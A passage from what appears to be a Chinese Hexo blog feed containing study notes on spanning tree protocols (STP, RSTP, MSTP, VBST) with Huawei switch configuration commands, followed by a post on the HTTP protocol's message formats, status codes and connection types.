title="二层交换机网络的冗余性与环路:"></a>二层交换机网络的冗余性与环路:</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/二层交换机环路.png" style="zoom:67%;" /><p>交换机在互连时一般都会使用冗余链路来实现备份。冗余链路虽然增强了网络的可靠性，但是也会产生环路，而环路会带来一系列的问题，继而导致通信质量下降和通信业务中断等问题。</p><blockquote><ul><li><p style="color:blue;">在现实中，除了冗余链路会引起环路，还有一些人为错误导致的环路</p></li></ul></blockquote><h5 id="问题一：广播风暴"><a href="#问题一：广播风暴" class="headerlink" title="问题一：广播风暴:"></a>问题一：广播风暴:</h5><p>如果交换机从一个接口上接收到的是一个广播帧，或者是一个目的MAC地址未知的单播帧，则会将这个帧向除源接口之外的所有其他接口转发。</p><blockquote><p>如果交换网络中有环路，则这个帧会被无限转发，此时便会形成广播风暴，网络中也会充斥着重复的数据帧</p></blockquote><h5 id="问题二：MAC地址表漂移"><a href="#问题二：MAC地址表漂移" class="headerlink" title="问题二：MAC地址表漂移"></a>问题二：MAC地址表漂移</h5><p>交换机是根据所接收到的数据帧的源地址和接收接口生成MAC地址表项的。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/MAC地址表漂移.png" style="zoom:67%;" /><p>如图，SW3收到一个广播帧泛洪，SW1从GE0/0/1接口接收到广播帧后学习且泛洪，形成MAC地址5489-98EE-788A与GE0/0/1的映射；SW2收到广播帧后学习且泛洪，SW1再次从GE0/0/2收到源MAC地址为5489-98EE-788A的广播帧并进行学习，5489-98EE-788A会不断地在GE0/0/1与GE0/0/2接口之间来回切换，这被称为MAC地址漂移现象。</p><p>在网络中部署生成树后，交换机之间会进行生成树协议报文的交互并进行无环拓扑计算，最终将网络中的某个（或某些）接口进行阻塞（Block），从而打破环路</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/生成树协议.png" style="zoom:67%;" /><p>交换机上运行的生成树协议会持续监控网络的拓扑结构，当网络拓扑结构发生变化时，生成树能感知到这些变化，并且自动做出调整<br>因此，生成树既能解决二层环路问题，也能为网络的冗余性提供一种方案</p><h5 id="环路类别："><a href="#环路类别：" class="headerlink" title="环路类别："></a>环路类别：</h5><p>常见环路主要分为<strong>二层环路</strong>和<strong>三层环路</strong>。</p><blockquote><ol><li>二层环路主要因为网络中部署了二层冗余环境，或人为的误接线缆导致，可以通过借助特定的协议或机制实现二层防环；</li><li>三层环路主要因为路由环路，可以通过动态路由协议防环和IP报文头部中的TTL字段用于防止报文被无止尽地转发</li></ol></blockquote><h3 id="STP的基本概念及工作原理"><a href="#STP的基本概念及工作原理" class="headerlink" title="STP的基本概念及工作原理"></a>STP的基本概念及工作原理</h3><ul><li>选举一个根桥</li><li>每个非根交换机选举一个根接口</li><li>每个网段选举一个指定接口</li><li>阻塞非根、非指定接口</li></ul><p>每个STP网络中，都会存在一个根桥，其他交换机为非根桥。</p><p>根桥或者根交换机位于整个逻辑树的根部，是STP网络的逻辑中心，非根桥是根桥的下游设备。当现有根桥产生故障时，非根桥之间会交互信息并重新选举根桥，交互的这种信息被称为BPDU。</p><blockquote><p style="color:red;">STP中定义了三种接口角色：指定接口，根接口和预备接口</p></blockquote><ul><li>指定接口是交换机向所连网段转发配置BPDU的接口，每个网段有且只能有一个指定接口。一般情况下，根桥的每个接口总是指定接口。</li><li>根接口是非根交换机去往根桥路径最优的接口。在一个运行STP协议的交换机上最多只有一个根接口，但根桥上没有根接口。</li><li>如果一个接口既不是指定接口也不是根接口，则此接口为预备接口。预备接口将被阻塞。</li></ul><h4 id="STP的基本概念："><a href="#STP的基本概念：" class="headerlink" title="STP的基本概念："></a>STP的基本概念：</h4><h5 id="桥ID（Bridge-ID，BID）"><a href="#桥ID（Bridge-ID，BID）" class="headerlink" title="桥ID（Bridge ID，BID）"></a>桥ID（Bridge ID，BID）</h5><p>IEEE 802.1D标准中规定BID由16位的桥优先级（Bridge Priority）与桥MAC地址构成。</p><ol><li>在STP中，每一台交换机都有一个标示符叫做Bridge ID或者桥ID，桥ID由16位的桥优先级（Bridge-Priority）和48位的MAC地址构成</li><li>在STP网络中，桥优先级是可以配置的，取值范围是0～65535，默认值为32768<ul><li>可以修改，但是取值必须为4096的倍数。</li></ul></li><li>优先级最高的设备（数值越小越优先）会被选举为根桥<ul><li>如果优先级相同，则会比较MAC地址，MAC地址越小则越优先</li></ul></li></ol><h5 id="根桥（Root-Bridge）"><a href="#根桥（Root-Bridge）" class="headerlink" title="根桥（Root Bridge）"></a>根桥（Root Bridge）</h5><p>STP引入了根桥（Root Bridge）</p><p>对于一个STP网络，全网中只有一个根桥，是整个网络的逻辑中心。根桥会根据网络拓扑的变化而动态变化</p><blockquote><p style="color:orange;">网络收敛后，根桥会按照一定的时间间隔产生并向外发送配置BPDU，其他设备仅对该报文进行处理，传达拓扑变化记录，从而保证拓扑的稳定</p></blockquote><h5 id="开销（Cost）"><a href="#开销（Cost）" class="headerlink" title="开销（Cost）"></a>开销（Cost）</h5><blockquote><p style="color:skyblue;">每一个激活了STP的接口都维护着一个Cost值，接口的Cost主要用于计算根路径开销，也就是到达根的开销</p></blockquote><p>接口的缺省Cost除了与其速率、工作模式有关，还与交换机使用的STP Cost计算方法有关。<br>接口带宽越大，则Cost值越小。<br>用户也可以根据需要通过命令调整接口的Cost</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/生成树开销.png" style="zoom: 50%;" /><h5 id="根路径开销（Root-Path-Cost）"><a href="#根路径开销（Root-Path-Cost）" class="headerlink" title="根路径开销（Root Path Cost）"></a>根路径开销（Root Path Cost）</h5><blockquote><p>一台设备从某个接口到达根桥的RPC等于从根桥到该设备沿途所有入方向接口的Cost累加</p></blockquote><p>非根桥通过对比多条路径的路径开销，选出到达根桥的最短路径，这条最短路径的路径开销被称为RPC，并生成无环树状网络</p><p>根桥的根路径开销是0</p><h5 id="接口ID（Port-ID，PID）"><a href="#接口ID（Port-ID，PID）" class="headerlink" title="接口ID（Port ID，PID）"></a>接口ID（Port ID，PID）</h5><p>运行STP的交换机使用接口ID来标识每个接口，接口ID主要用于在特定场景下选举指定接口。<br>接口ID由两部分构成的，高4 bit是接口优先级，低12 bit是接口编号。<br>激活STP的接口会维护一个缺省的接口优先级，取值范围是0到240，步长为16，即取值必须为16的整数倍。在华为交换机上，该值为128。用户可以根据实际需要，通过命令修改该优先级。</p><h5 id="BPDU（Bridge-Protocol-Data-Unit，网桥协议数据单元）"><a href="#BPDU（Bridge-Protocol-Data-Unit，网桥协议数据单元）" class="headerlink" title="BPDU（Bridge Protocol Data Unit，网桥协议数据单元）"></a>BPDU（Bridge Protocol Data Unit，网桥协议数据单元）</h5><p>BPDU是STP能够正常工作的根本。BPDU是STP的协议报文。<br>STP交换机之间会交互BPDU报文，这些BPDU报文携带着一些重要信息，正是基于这些信息，STP才能够顺利工作。<br>BPDU分为两种类型：</p><ul><li>配置BPDU（Configuration BPDU）</li><li>TCN BPDU（Topology Change Notification BPDU）</li></ul><blockquote><p>配置BPDU是STP进行拓扑计算的关键；TCN BPDU只在网络拓扑发生变更时才会被触发。</p></blockquote><h4 id="配置BPDU的报文格式"><a href="#配置BPDU的报文格式" class="headerlink" title="配置BPDU的报文格式:"></a>配置BPDU的报文格式:</h4><img src="D:\gitee-blog\source\_posts\生成树协议\BPDU报文格式.png" style="zoom: 67%;" /><table><thead><tr><th align="center">字节</th><th align="left"><strong>字段</strong></th><th align="left">描述</th></tr></thead><tbody><tr><td align="center"><strong>2</strong></td><td align="left"><strong>PID</strong></td><td align="left">协议ID ，对于STP而言，该字段的值总为0</td></tr><tr><td align="center"><strong>1</strong></td><td align="left"><strong>PVI</strong></td><td align="left">协议版本ID，对于STP而言，该字段的值总为0</td></tr><tr><td align="center"><strong>1</strong></td><td align="left"><strong>BPDU</strong> <strong>Type</strong></td><td align="left">指示本BPDU的类型，若值为0x00，则表示本报文为配置BPDU；若值为0x80，则为TCN BPDU</td></tr><tr><td align="center"><strong>1</strong></td><td align="left"><strong>Flags</strong></td><td align="left">标志，STP只使用了该字段的最高及最低两个比特位，最低位是TC（Topology Change，拓扑变更）标志，最高位是TCA（Topology Change Acknowledgment，拓扑变更确认）标志</td></tr><tr><td align="center"><strong>8</strong></td><td align="left"><strong>Root</strong> <strong>ID</strong></td><td align="left">根网桥的桥ID</td></tr><tr><td align="center"><strong>4</strong></td><td align="left"><strong>RPC</strong></td><td align="left">根路径开销，到达根桥的STP Cost</td></tr><tr><td align="center"><strong>8</strong></td><td align="left"><strong>Bridge ID</strong></td><td align="left">BPDU发送桥的ID</td></tr><tr><td align="center"><strong>2</strong></td><td align="left"><strong>Port ID</strong></td><td align="left">BPDU发送网桥的接口ID（优先级+接口号）</td></tr><tr><td align="center"><strong>2</strong></td><td align="left"><strong>MessageAge</strong></td><td align="left">消息寿命，从根网桥发出BPDU之后的秒数，每经过一个网桥都加1，所以它本质上是到达根桥的跳数</td></tr><tr><td align="center"><strong>2</strong></td><td align="left"><strong>Max Age</strong></td><td align="left">最大寿命，当一段时间未收到任何BPDU，生存期到达最大寿命时，网桥认为该接口连接的链路发生故障。默认20s</td></tr><tr><td align="center"><strong>2</strong></td><td align="left"><strong>Hello Time</strong></td><td align="left">根网桥连续发送的BPDU之间的时间间隔，默认2s</td></tr><tr><td align="center"><strong>2</strong></td><td align="left"><strong>Forward  Delay</strong></td><td align="left">转发延迟，在侦听和学习状态所停留的时间间隔，默认15s</td></tr></tbody></table><h5 id="计时器："><a href="#计时器：" class="headerlink" title="计时器："></a>计时器：</h5><p>STP协议中包含一些重要的时间参数</p><ol><li>Hello Time是指运行STP协议的设备发送配</li><li>置BPDU的时间间隔，用于检测链路是否存在故障。交换机每隔Hello Time时间会向周围的交换机发送配置BPDU报文，以确认链路是否存在故障。当网络拓扑稳定后，该值只有在根桥上修改才有效</li><li>Message Age:如果配置BPDU是根桥发出的，则Message Age为0。否则，Message Age是从根桥发送到当前桥接收到BPDU的总时间，包括传输延时等。实际实现中，配置BPDU报文每经过一个交换机，Message Age增加1</li><li>Max Age是指BPDU报文的老化时间,可在根桥上通过命令人为改动这个值。Max Age通过配置BPDU报文的传递，可以保证Max Age在整网中一致。非根桥设备收到配置BPDU报文后，会将报文中的Message Age和Max Age进行比较：如果Message Age小于等于Max Age，则该非根桥设备会继续转发配置BPDU报文。如果Message Age大于Max Age，则该配置BPDU报文将被老化掉。该非根桥设备将直接丢弃该配置BPDU，并认为是网络直径过大，导致了根桥连接失败。</li></ol><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/BPDU计时器.png" style="zoom:67%;" /><p>配置BPDU报文每经过一个交换机，Message Age都加1。<br>如果Message Age大于Max Age，非根桥会丢弃该配置BPDU。</p><h3 id="STP的基础配置"><a href="#STP的基础配置" class="headerlink" title="STP的基础配置"></a>STP的基础配置</h3><h5 id="配置生成树工作模式："><a href="#配置生成树工作模式：" class="headerlink" title="配置生成树工作模式："></a>配置生成树工作模式：</h5><pre class="line-numbers language-none"><code class="language-none">[Huawei] stp mode &#123; stp | rstp | mstp &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>交换机支持STP、RSTP和MSTP（Multiple Spanning Tree Protocol）三种生成树工作模式，默认情况工作在MSTP模式。</p></blockquote><h5 id="配置根桥和备份根桥："><a href="#配置根桥和备份根桥：" class="headerlink" title="配置根桥和备份根桥："></a>配置根桥和备份根桥：</h5><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">[Huawei] stp root primary &#x2F;&#x2F;配置当前设备为根桥，缺省情况下，交换机不作为任何生成树的根桥。配置后该设备优先级数值自动为0，并且不能更改设备优先级。[Huawei] stp root secondary&#x2F;&#x2F;配置当前交换机为备份根桥，缺省情况下，交换机不作为任何生成树的备份根桥。配置后该设备优先级数值为4096，并且不能更改设备优先级。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置交换机的STP优先级："><a href="#配置交换机的STP优先级：" class="headerlink" title="配置交换机的STP优先级："></a>配置交换机的STP优先级：</h5><pre class="line-numbers language-none"><code class="language-none">[Huawei] stp priority priority []# 缺省情况下，交换机的优先级取值是32768<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="配置接口路径开销"><a href="#配置接口路径开销" class="headerlink" title="配置接口路径开销:"></a>配置接口路径开销:</h5><pre class="line-numbers language-none"><code class="language-none">[Huawei] stp pathcost-standard &#123; dot1d-1998 | dot1t | legacy &#125;#配置接口路径开销计算方法。缺省情况下，路径开销值的计算方法为IEEE 802.1t标准方法。#同一网络内所有交换机的接口路径开销应使用相同的计算方法。[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp cost cost设置当前接口的路径开销值。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置接口优先级"><a href="#配置接口优先级" class="headerlink" title="配置接口优先级:"></a>配置接口优先级:</h5><pre class="line-numbers language-none"><code class="language-none">[Huawei-intf] stp priority priority<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>配置接口的优先级。缺省情况下，交换机接口的优先级取值是128。</p></blockquote><p>启用STP/RSTP/MSTP</p><pre class="line-numbers language-none"><code class="language-none">[Huawei] stp enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>使能交换机的STP/RSTP/MSTP功能。缺省情况下，设备的STP/RSTP/MSTP功能处于启用状态。</p></blockquote><h3 id="RSTP对STP的改进"><a href="#RSTP对STP的改进" class="headerlink" title="RSTP对STP的改进"></a>RSTP对STP的改进</h3><p>IEEE于2001年发布的802.1w标准定义了快速生成树协议RSTP（Rapid Spanning-Tree Protocol），RSTP在STP基础上进行了改进，实现了网络拓扑快速收敛。</p><p>RSTP（快速生成树）是从STP演化而来的，基本思想一样；当交换网络拓扑结构发生变化时， RSTP可以通过Proposal/Agreement机制更快地恢复网络的连通性。</p><p>根据STP的不足，RSTP删除了3种接口状态，新增加了2种接口角色，并且把接口属性充分的按照状态和角色解耦；此外，RSTP还增加了相应的一些增强特性和保护措施，实现网络的稳定和快速收敛。</p><blockquote><ul><li>RSTP是可以向下兼容STP的，但不推荐这样的做，RSTP会失去其快速收敛的优势，而STP慢速收敛的缺点会暴露出来。</li></ul></blockquote><h4 id="RSTP对STP的其他改进"><a href="#RSTP对STP的其他改进" class="headerlink" title="RSTP对STP的其他改进:"></a>RSTP对STP的其他改进:</h4><p>配置BPDU的处理发生变化：</p><ol><li>拓扑稳定后，配置BPDU报文的发送方式进行了优化；</li><li>使用更短的BPDU超时计时；</li><li>对处理次等BPDU的方式进行了优化；</li></ol><p>配置BPDU格式的改变，充分利用了STP协议报文中的Flag字段，明确了接口角色。</p><p>RSTP拓扑变化处理：相比于STP进行了优化，加速针对拓扑变更的反应速度。</p><h4 id="接口角色不同"><a href="#接口角色不同" class="headerlink" title="接口角色不同"></a>接口角色不同</h4><ul><li><p>从配置BPDU报文发送角度来看：</p><ul><li><p>预备（Alternate）接口就是由于学习到其它网桥发送的配置BPDU报文而阻塞的接口</p></li><li><p>备份（Backup）接口就是由于学习到自己发送的配置BPDU报文而阻塞的接口</p></li></ul></li><li><p>从用户流量角度来看：</p><ul><li>Alternate接口提供了从指定桥到根的另一条可切换路径，作为根接口的备份接口</li><li>Backup接口作为指定接口的备份，提供了另一条从根桥到相应网段的备份通路</li></ul></li></ul><blockquote><p>通过接口角色的增补，简化了生成树协议的理解及部署</p></blockquote><h5 id="边缘接口"><a href="#边缘接口" class="headerlink" title="边缘接口:"></a>边缘接口:</h5><blockquote><p>如果指定接口位于整个域的边缘，不再与任何交换设备连接，这种接口叫做边缘接口。</p></blockquote><p>边缘接口一般与用户终端设备直接连接，不与任何交换设备连接。边缘接口正常情况下接收不到配置BPDU报文，不参与RSTP运算，可以由Disabled状态直接转到Forwarding状态，且不经历时延，就像在接口上将STP禁用了一样。但是，一旦边缘接口收到配置BPDU报文，就丧失了边缘接口属性，成为普通STP接口，并重新进行生成树计算，从而引起网络震荡</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/边缘接口.png" style="zoom:67%;" /><h4 id="接口状态不同"><a href="#接口状态不同" class="headerlink" title="接口状态不同"></a>接口状态不同</h4><ul><li><p>RSTP的状态规范把原来的5种状态缩减为3种</p><table><thead><tr><th align="left">STP接口状态</th><th>RSTP接口状态</th><th>接口在拓扑中的角色</th></tr></thead><tbody><tr><td align="left">Forwarding</td><td>Forwarding</td><td>包括根接口、指定接口</td></tr><tr><td align="left">Learning</td><td>Learning</td><td>包括根接口、指定接口</td></tr><tr><td align="left">Listening</td><td>Discarding</td><td>包括根接口、指定接口</td></tr><tr><td align="left">Blocking</td><td>Discarding</td><td>包括Alternate接口、Backup接口</td></tr><tr><td align="left">Disabled</td><td>Discarding</td><td>包括Disable接口</td></tr></tbody></table><ul><li>如果不转发用户流量也不学习MAC地址，那么接口状态就是Discarding状态</li><li>如果不转发用户流量但是学习MAC地址，那么接口状态就是Learning状态</li><li>如果既转发用户流量又学习MAC地址，那么接口状态就是Forwarding状态</li></ul></li></ul><h3 id="生成树技术进阶"><a href="#生成树技术进阶" class="headerlink" title="生成树技术进阶"></a>生成树技术进阶</h3><h4 id="STP-RSTP的缺陷"><a href="#STP-RSTP的缺陷" class="headerlink" title="STP/RSTP的缺陷"></a>STP/RSTP的缺陷</h4><p>所有的VLAN共享一棵生成树</p><blockquote><ul><li><blockquote><p style="color:blue;">由于局域网内所有的VLAN共享一棵生成树，因此无法在VLAN间实现数据流量的负载均衡，链路被阻塞后将不承载任何流量，还有可能造成部分VLAN的报文无法转发</p></blockquote></li></ul></blockquote><h4 id="VBST：基于VLAN的生成树"><a href="#VBST：基于VLAN的生成树" class="headerlink" title="VBST：基于VLAN的生成树"></a>VBST：基于VLAN的生成树</h4><p>VBST（VLAN-Based Spanning Tree）生成树解决方案。该解决方案中，生成树的形成是基于VLAN的，不同VLAN间可形成相互独立的生成树，不同VLAN内的流量沿着各自的生成树转发，进而可实现流量的负载分担，有效地提高了链路带宽的利用率；消除了网络中可能存在的通信环路；配置和维护简单，可降低配置和维护成本。但如果网络中VLAN的数量较多，为每个VLAN执行独立的生成树计算将耗费交换机大量的资源。</p><h5 id="企业网中部署VBST："><a href="#企业网中部署VBST：" class="headerlink" title="企业网中部署VBST："></a>企业网中部署VBST：</h5><ul><li>可消除网络中可能存在的通信环路</li><li>可实现链路的复用和流量的负载分担，进而有效地提高链路带宽的利用率</li><li>配置和维护简单，进而可降低配置和维护成本</li></ul><blockquote><p style="color:blue;">但是如果网络中VLAN的数量较多，为每个VLAN执行独立的生成树计算将耗费交换机大量的资源</p></blockquote><h4 id="MSTP：多生成树"><a href="#MSTP：多生成树" class="headerlink" title="MSTP：多生成树"></a>MSTP：多生成树</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/MSTP多生成树.png" style="zoom:50%;" /><p>为了弥补STP和RSTP的缺陷，IEEE于2002年发布的802.1s标准定义了MSTP。</p><blockquote><p>MSTP兼容STP和RSTP，既可以快速收敛，又提供了数据转发的多个冗余路径，在数据转发过程中实现VLAN数据的负载均衡。</p></blockquote><p>MSTP把一个交换网络划分成多个域，每个域内形成多棵生成树，生成树之间彼此独立。</p><ul><li>每棵生成树叫做一个多生成树实例MSTI    Multiple Spanning Tree Instance</li><li>生成树实例是多个VLAN的集合所对应的生成树</li><li>通过将多个VLAN捆绑到一个实例，可以节省通信开销和资源占用率。</li><li>MSTP各个实例拓扑的计算相互独立，在这些实例上可以实现负载均衡。</li><li>可以把多个相同拓扑结构的VLAN映射到一个实例里，这些VLAN在接口上的转发状态取决于接口在对应实例的状态</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/MSTP多生成树.png" style="zoom:50%;" /><h4 id="堆叠技术："><a href="#堆叠技术：" class="headerlink" title="堆叠技术："></a>堆叠技术：</h4><blockquote><p style="color:orange;">堆叠iStack（Intelligent Stack），是指将多台支持堆叠特性的交换机设备组合在一起，从逻辑上组合成一台整体交换设备</p></blockquote><p>堆叠系统建立之前，每台交换机都是单独的实体，有自己独立的IP地址和MAC地址，对外体现为多台交换机，用户需要独立的管理所有的交换机；堆叠建立后堆叠成员对外体现为一个统一的逻辑实体，用户使用一个IP地址对堆叠中的所有交换机进行管理和维护</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/21/生成树协议/堆叠技术.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HCIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超文本传输协议HTTP</title>
      <link href="/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li>URL由4部分组成:<ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p> 首部行</p></li><li><p>用来说明浏览器、服务器或报文主体的一些信息。</p></li><li><p>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</p></li><li><p>首部可以有好几行，但也可以不使用。</p></li><li><p>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</p></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/万维网工作过程.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件传输协议FTP</title>
      <link href="/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/</url>
      
